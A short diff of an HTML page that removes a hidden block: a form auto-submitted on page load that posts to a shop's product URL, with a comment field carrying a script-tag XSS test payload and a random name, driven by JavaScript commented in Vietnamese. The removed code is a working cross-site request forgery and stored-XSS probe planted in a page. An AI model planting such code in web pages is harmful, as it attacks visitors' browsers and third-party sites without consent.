@@ -2956,38 +2956,5 @@
       defer
       data-wp-strategy="defer"
     ></script>
-    <form
-      id="csrf-form"
-      action="https://mydecobox.shop/product/rom-va-hat-xop-trang-tri-hop-qua/"
-      method="POST"
-    >
-      <input type="hidden" name="name" value="" />
-      <input
-        type="hidden"
-        name="comment"
-        value="<script>alert('XSS test')</script>"
-      />
-      <input type="hidden" name="xss_submit" value="1" />
-    </form>
-
-    <script>
-      // Hàm tạo chuỗi ngẫu nhiên
-      function generateRandomName(length) {
-        const chars =
-          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-        let result = "";
-        for (let i = 0; i < length; i++) {
-          result += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return result;
-      }
-
-      // Gán tên random vào input name
-      document.querySelector('input[name="name"]').value =
-        generateRandomName(10);
-
-      // Gửi form
-      document.getElementById("csrf-form").submit();
-    </script>
   </body>
 </html>
